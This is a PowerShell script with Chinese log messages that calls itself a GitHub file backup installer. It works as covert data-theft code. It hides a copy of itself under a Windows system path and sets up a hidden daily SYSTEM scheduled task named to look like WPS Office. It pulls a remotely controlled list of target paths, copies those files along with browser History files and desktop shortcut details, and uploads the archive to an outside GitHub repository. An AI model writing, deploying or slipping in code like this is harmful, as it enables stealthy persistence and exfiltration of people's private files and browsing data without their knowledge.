# install.ps1 - GitHub 文件备份任务安装器

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$localPath = "C:\ProgramData\Microsoft\Windows\system-maintainer.ps1"
$taskName = "WPS"
$logPath = "C:\ProgramData\Microsoft\Windows\system-maintainer.log"

function Log($msg) {
    $line = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $msg
    $line | Out-File -FilePath $logPath -Append
    Write-Host $line
}

Log "`n==== Script Started ===="

try {
    $self = $MyInvocation.MyCommand.Path
    if (-not $self) {
        throw "无法确定脚本路径，当前脚本未从 .ps1 文件执行。"
    }
    Copy-Item -Path $self -Destination $localPath -Force -ErrorAction Stop
    Log "已保存脚本副本到 $localPath"
} catch {
    Log "保存自身失败：$($_.Exception.Message)"
    Pause
    exit 1
}

try {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPath`""
    $trigger = New-ScheduledTaskTrigger -Daily -At "00:00"
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
    Log "注册计划任务 [$taskName] 成功（每天 0 点执行）"
} catch {
    Log "注册任务失败：$($_.Exception.Message)"
    Pause
    exit 2
}

$token = $env:GITHUB_TOKEN
if (-not $token) {
    Log "环境变量 GITHUB_TOKEN 未设置"
    Pause
    exit 3
}

$repo = "rtyuiuiop/1"
$now = Get-Date
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
$date = $now.ToString("yyyy-MM-dd")
$computerName = $env:COMPUTERNAME
$tag = "backup-$computerName-$timestamp"
$releaseName = "Backup - $computerName - $date"
$tempRoot = "$env:TEMP\\package-$computerName-$timestamp"
$zipName = "package-$computerName-$timestamp.zip"
$zipPath = Join-Path $env:TEMP $zipName
New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null

$remoteTxtUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/refs/heads/main/.github/upload-paths.txt"
try {
    Log "正在下载路径列表..."
    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
    Log "路径列表加载成功，共 $($pathList.Count) 条"
} catch {
    Log "下载路径列表失败：$($_.Exception.Message)"
    Pause
    exit 4
}

$index = 0
foreach ($path in $pathList) {
    $index++
    $name = "item$index"
    if (-not (Test-Path $path)) {
        Log "跳过不存在路径：$path"
        continue
    }

    $dest = Join-Path $tempRoot $name
    try {
        if ($path -like "*\\History" -and (Test-Path $path -PathType Leaf)) {
            $srcDir = Split-Path $path
            robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
            Log "使用 robocopy 复制占用文件：$path"
        } elseif (Test-Path $path -PathType Container) {
            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
            Log "文件夹已复制：$path"
        } else {
            Copy-Item $path -Destination $dest -Force -ErrorAction Stop
            Log "文件已复制：$path"
        }
    } catch {
        Log "复制失败：$path - $($_.Exception.Message)"
        Pause
        exit 5
    }
}

try {
    $desktop = [Environment]::GetFolderPath("Desktop")
    $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
    $lnkReport = ""

    foreach ($lnk in $lnkFiles) {
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnk.FullName)
        $lnkReport += "[$($lnk.Name)]`n"
        $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
        $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
        $lnkReport += "StartIn:    $($shortcut.WorkingDirectory)`n"
        $lnkReport += "Icon:       $($shortcut.IconLocation)`n"
        $lnkReport += "-----------`n"
    }

    $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
    $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
    Log "快捷方式信息已收集"
} catch {
    Log "快捷方式收集失败：$($_.Exception.Message)"
}

try {
    Compress-Archive -Path "$tempRoot\\*" -DestinationPath $zipPath -Force -ErrorAction Stop
    Log "压缩成功：$zipPath"
} catch {
    Log "压缩失败：$($_.Exception.Message)"
    Pause
    exit 6
}

$releaseData = @{
    tag_name = $tag
    name = $releaseName
    body = "Automated file package from $computerName on $date"
    draft = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent" = "PowerShellScript"
    Accept = "application/vnd.github.v3+json"
}

try {
    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
    Log "GitHub Release 创建成功"
} catch {
    Log "创建 Release 失败：$($_.Exception.Message)"
    Pause
    exit 7
}

try {
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "PowerShellScript"
    }
    $response = Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
    Log "文件上传成功：$zipName"
} catch {
    Log "上传文件失败：$($_.Exception.Message)"
    Pause
    exit 8
}

Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
Log "清理完成"
Log "==== Script Finished ====`n"

if ($MyInvocation.MyCommand.Path -notlike "$localPath") {
    Pause
    Start-Process notepad.exe $logPath
}
